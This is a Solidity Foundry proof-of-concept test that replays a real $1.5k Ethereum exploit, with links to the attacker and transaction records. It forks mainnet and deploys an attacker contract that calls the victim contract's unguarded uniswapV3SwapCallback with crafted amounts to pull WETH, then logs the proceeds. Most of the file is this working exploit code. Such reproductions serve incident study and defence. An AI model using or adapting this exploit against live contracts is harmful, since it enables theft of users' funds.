pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "../interface.sol";

address constant attacker = 0xfe51ffcd2af4748d77130646988F966733583dc1;
address constant addr1 = 0xb3094734FE249A7b0110dC12D66F6C404aDA28Cb;
address constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

// @KeyInfo - Total Lost : $1.5k
// Attacker : https://etherscan.io/address/0xfe51ffcd2af4748d77130646988f966733583dc1
// Attack Contract : https://etherscan.io/address/0xa826dacf14a462bca2a6e4de4c27f20ed7b43b1d
// Vulnerable Contract : https://etherscan.io/address/0xb3094734fe249a7b0110dc12d66f6c404ada28cb
// Attack Tx : https://app.blocksec.com/explorer/tx/eth/0x83c71a83656b0fecfa860e76a9becf738930b3f1b2510c7d0339ab585090a82d
// Similar Attack Tx : https://app.blocksec.com/explorer/tx/eth/0xf93db4cdee0ed2af06067a9c953ebc62dd17f70be37961636c42d698cc23e932

// @Info
// Vulnerable Contract Code : 

// @Analysis
// Post-mortem : https://x.com/TenArmorAlert/status/1831637553415610877
// Twitter Guy : https://x.com/TenArmorAlert/status/1831637553415610877
// Hacking God : N/A

contract ContractTest is Test {
    function setUp() public {
        vm.createSelectFork("mainnet", 20683453-1);
    }
    
    function testPoC() public {

        vm.startPrank(attacker, attacker);
        AttackerC attC = new AttackerC();
        attC.attack();
        vm.stopPrank();
        emit log_named_decimal_uint("after attack: balance of address(attC)", IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2).balanceOf(address(attC)), 18);
    }
}

// 0xA826daCf14a462bca2A6e4de4c27F20ED7B43B1D
contract AttackerC {
    function attack() public {
        // call addr1.uniswapV3SwapCallback(3600e14, -86965571293199577, abi.encodePacked(uint256(0)))
        bytes memory data = abi.encodePacked(uint8(0), uint256(0));
        (bool ok, ) = addr1.call(
            abi.encodeWithSelector(
                bytes4(keccak256("uniswapV3SwapCallback(int256,int256,bytes)")),
                int256(360000000000000000),
                int256(-86965571293199577),
                data
            )
        );
    }

    function token0() external pure returns (address) {
        return weth;
    }

    function fallback() external payable {}
}